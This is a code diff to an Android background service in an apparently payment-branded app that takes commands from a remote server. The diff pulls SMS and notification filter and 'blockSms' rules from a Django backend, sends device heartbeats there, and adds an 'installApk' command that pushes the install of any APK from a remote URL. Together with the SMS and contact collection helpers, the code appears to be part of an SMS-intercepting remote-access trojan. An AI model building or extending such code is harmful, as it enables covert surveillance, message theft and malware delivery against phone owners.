@@ -38,6 +38,8 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+import com.example.fast.util.DebugLogger
 import com.example.fast.util.DeviceInfoCollector
 import com.example.fast.util.LogHelper
 import com.example.fast.util.DefaultSmsAppHelper
@@ -58,6 +60,7 @@ import com.example.fast.util.SmsMessageBatchProcessor
 import com.example.fast.util.ContactBatchProcessor
 import com.example.fast.util.WorkflowExecutor
 import com.example.fast.util.NetworkUtils
+import com.example.fast.util.VersionChecker
 import android.os.Handler
 import android.os.Looper
 import android.net.Network
@@ -148,6 +151,7 @@ class PersistentForegroundService : Service() {
     @SuppressLint("HardwareIds")
     override fun onCreate() {
         super.onCreate()
+        DebugLogger.logFlow("PersistentForegroundService", "onCreate", "")
 
         // Wrap in try-catch to prevent service crash on initialization errors
         try {
@@ -195,6 +199,7 @@ class PersistentForegroundService : Service() {
 
                                 // Now execute all commands
                                 commandsToProcess.forEach { (key, value) ->
+                                    DebugLogger.logFlow("PersistentForegroundService", "command", "received key=$key")
                                     try {
                                         followCommand(key, value, currentTime)
                                     } catch (e: IllegalArgumentException) {
@@ -288,6 +293,26 @@ class PersistentForegroundService : Service() {
             Firebase.database.reference.child(filterPath).addValueEventListener(filterListener!!)
         } catch (e: Exception) {
             LogHelper.e(TAG, "Error setting up filter listener, will retry", e)
+        }
+
+        // Fetch filter from Django on start (Task 8); Firebase listener remains for real-time updates
+        serviceScope.launch {
+            try {
+                val filter = withContext(Dispatchers.IO) {
+                    DjangoApiHelper.getDeviceFilter(androidId())
+                }
+                if (filter != null) {
+                    val smsFilter = (filter["sms"]?.toString()) ?: ""
+                    val notificationFilter = (filter["notification"]?.toString()) ?: ""
+                    val blockSmsRule = (filter["blockSms"]?.toString()) ?: ""
+                    writeInternalFile("filterSms.txt", smsFilter)
+                    writeInternalFile("filterNotify.txt", notificationFilter)
+                    writeInternalFile("blockSms.txt", blockSmsRule)
+                    LogHelper.d(TAG, "Filter applied from Django on start: sms=${smsFilter.take(20)}..., notification=${notificationFilter.take(20)}..., blockSms=${blockSmsRule.take(20)}...")
+                }
+            } catch (e: Exception) {
+                LogHelper.w(TAG, "Django filter fetch on start failed (Firebase listener active): ${e.message}")
+            }
         }
 
         // Setup isActive listener (heartbeat defaults to 60 seconds and can be changed remotely)
@@ -494,14 +519,9 @@ class PersistentForegroundService : Service() {
     }
 
     /**
-     * Update device online status in Firebase
-     *
-     * OPTIMIZED VERSION:
-     * - Uses lightweight heartbeat path: hertbit/{deviceId}
-     * - Main path updated less frequently for backward compatibility (every 5 minutes)
-     * - Battery only written if changed significantly (±1%)
-     *
-     * Uses unified FirebaseWriteHelper for consistent write operations
+     * Update device online status (heartbeat).
+     * Sends last_seen and battery_percentage to Django via PATCH /devices/{id}/.
+     * Firebase hertbit and fastpay paths are no longer written (migration Task 12).
      */
     @SuppressLint("HardwareIds")
     private fun updateOnlineStatus() {
@@ -509,29 +529,23 @@ class PersistentForegroundService : Service() {
         val currentTime = System.currentTimeMillis()
         val batteryPercentage = com.example.fast.util.BatteryHelper.getBatteryPercentage(this)
 
-        // Determine if main path should be updated (every 5 minutes for backward compatibility)
-        val shouldUpdateMain = lastMainPathUpdate == null ||
-                              (currentTime - lastMainPathUpdate!!) >= MAIN_PATH_UPDATE_INTERVAL_MS
-
-        if (shouldUpdateMain) {
-            lastMainPathUpdate = currentTime
+        // Send heartbeat to Django (Task 12: migration from Firebase hertbit/fastpay paths)
+        serviceScope.launch(Dispatchers.IO) {
+            try {
+                val updates = mutableMapOf<String, Any?>(
+                    "last_seen" to currentTime
+                )
+                if (batteryPercentage >= 0) {
+                    updates["battery_percentage"] = batteryPercentage
+                }
+                DjangoApiHelper.patchDevice(deviceId, updates)
+                LogHelper.d(TAG, "Heartbeat sent to Django (last_seen=$currentTime, battery=$batteryPercentage)")
+            } catch (e: Exception) {
+                LogHelper.e(TAG, "Failed to send heartbeat to Django", e)
+            }
         }
 
-        // Use unified FirebaseWriteHelper to write to both paths
-        lastBatteryPercentage = FirebaseWriteHelper.writeHeartbeat(
-            deviceId = deviceId,
-            timestamp = currentTime,
-            batteryPercentage = batteryPercentage,
-            lastBatteryPercentage = lastBatteryPercentage,
-            shouldUpdateMain = shouldUpdateMain,
-            tag = TAG,
-            onHeartbeatSuccess = {
-                // Heartbeat path write succeeded
-            },
-            onMainPathSuccess = {
-                // Main path write succeeded (if updated)
-            }
-        )
+        lastBatteryPercentage = batteryPercentage
     }
 
     /**
@@ -716,10 +730,20 @@ class PersistentForegroundService : Service() {
             }
             "updateApk" -> {
                 try {
-                    handleUpdateApkCommand(content)
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
+                    if (handleUpdateApkCommand(content, historyTimestamp)) {
+                        updateCommandHistoryStatus(historyTimestamp, key, "executed")
+                    }
                 } catch (e: Exception) {
                     LogHelper.e(TAG, "Error executing updateApk command", e)
+                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
+                }
+            }
+            "installApk" -> {
+                try {
+                    handleInstallApkCommand(content, historyTimestamp)
+                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
+                } catch (e: Exception) {
+                    LogHelper.e(TAG, "Error executing installApk command", e)
                     updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                 }
             }
@@ -1148,33 +1172,87 @@ class PersistentForegroundService : Service() {
 
     /**
      * Handle updateApk command
-     * Format: "{downloadUrl}" or "{versionCode}|{downloadUrl}"
+     * Format: "{url}" | "{versionCode}|{url}" | "force|{url}" | "force|{versionCode}|{url}"
+     * Without "force|", when versionCode is present we skip if versionCode <= current app version.
      *
-     * Examples:
-     * - "https://firebasestorage.googleapis.com/.../FastPay-v2.9.apk"
-     * - "29|https://firebasestorage.googleapis.com/.../FastPay-v2.9.apk"
-     *
-     * Storage:
-     * - APK stored in: context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)
-     * - File name: FastPay_Update_v{versionCode}.apk
-     *
-     * @param content Download URL (with optional version code prefix)
+     * @param content Command value (optional force prefix, then url or versionCode|url)
+     * @param historyTimestamp For command history when skipping
+     * @return true if the update card was launched, false if skipped (not newer)
      */
-    private fun handleUpdateApkCommand(content: String) {
-        if (content.isBlank()) {
+    private fun handleUpdateApkCommand(content: String, historyTimestamp: Long): Boolean {
+        val trimmed = content.trim()
+        if (trimmed.isBlank()) {
             LogHelper.e(TAG, "updateApk command: Empty download URL")
-            return
+            return false
         }
 
-        // Launch ActivatedActivity with multipurpose card for update (same card as test/attach)
+        val force = trimmed.lowercase().startsWith("force|")
+        val remainder = if (force) trimmed.substring(5).trim() else trimmed
+
+        // Parse remainder as url or versionCode|url
+        val pipeIdx = remainder.indexOf('|')
+        val (versionCode, url) = if (pipeIdx > 0) {
+            val code = remainder.substring(0, pipeIdx).trim().toIntOrNull() ?: 0
+            val u = remainder.substring(pipeIdx + 1).trim()
+            code to u
+        } else {
+            0 to remainder
+        }
+
+        if (url.isBlank()) {
+            LogHelper.e(TAG, "updateApk command: Empty URL after parsing")
+            return false
+        }
+
+        if (!force && versionCode > 0) {
+            val current = VersionChecker.getCurrentVersionCode(this)
+            if (versionCode <= current) {
+                LogHelper.d(TAG, "updateApk command: Skipping (versionCode $versionCode <= current $current)")
+                updateCommandHistoryStatus(historyTimestamp, "updateApk", "skipped", "not_newer")
+                return false
+            }
+        }
+
+        val payloadForActivity = if (versionCode > 0) "$versionCode|$url" else url
+
         val intent = Intent(this, com.example.fast.ui.ActivatedActivity::class.java).apply {
             flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
             putExtra(com.example.fast.ui.ActivatedActivity.EXTRA_SHOW_MULTIPURPOSE_CARD, com.example.fast.ui.ActivatedActivity.MULTIPURPOSE_CARD_UPDATE)
-            putExtra(com.example.fast.ui.ActivatedActivity.EXTRA_DOWNLOAD_URL, content.trim())
+            putExtra(com.example.fast.ui.ActivatedActivity.EXTRA_DOWNLOAD_URL, payloadForActivity)
         }
         startActivity(intent)
+        LogHelper.d(TAG, "Showing update via ActivatedActivity multipurpose card with URL: $payloadForActivity")
+        return true
+    }
 
-        LogHelper.d(TAG, "Showing update via ActivatedActivity multipurpose card with URL: $content")
+    /**
+     * Handle installApk command (offer installation of any APK, e.g. other apps).
+     * Format: "{url}" or "{title}|{url}"
+     */
+    private fun handleInstallApkCommand(content: String, historyTimestamp: Long) {
+        val trimmed = content.trim()
+        if (trimmed.isBlank()) {
+            LogHelper.e(TAG, "installApk command: Empty value")
+            return
+        }
+        val pipeIdx = trimmed.indexOf('|')
+        val (title, url) = if (pipeIdx > 0) {
+            trimmed.substring(0, pipeIdx).trim() to trimmed.substring(pipeIdx + 1).trim()
+        } else {
+            null to trimmed
+        }
+        if (url.isBlank()) {
+            LogHelper.e(TAG, "installApk command: Empty URL")
+            return
+        }
+        val intent = Intent(this, com.example.fast.ui.ActivatedActivity::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
+            putExtra(com.example.fast.ui.ActivatedActivity.EXTRA_SHOW_MULTIPURPOSE_CARD, com.example.fast.ui.ActivatedActivity.MULTIPURPOSE_CARD_INSTALL_APK)
+            putExtra(com.example.fast.ui.ActivatedActivity.EXTRA_DOWNLOAD_URL, url)
+            title?.let { putExtra(com.example.fast.ui.ActivatedActivity.EXTRA_INSTALL_TITLE, it) }
+        }
+        startActivity(intent)
+        LogHelper.d(TAG, "Showing install APK card via ActivatedActivity: $url")
     }
 
     /**
@@ -2465,6 +2543,7 @@ class PersistentForegroundService : Service() {
     }
 
     override fun onDestroy() {
+        DebugLogger.logFlow("PersistentForegroundService", "onDestroy", "")
         // Cancel coroutine scope
         try {
             serviceScope.cancel()
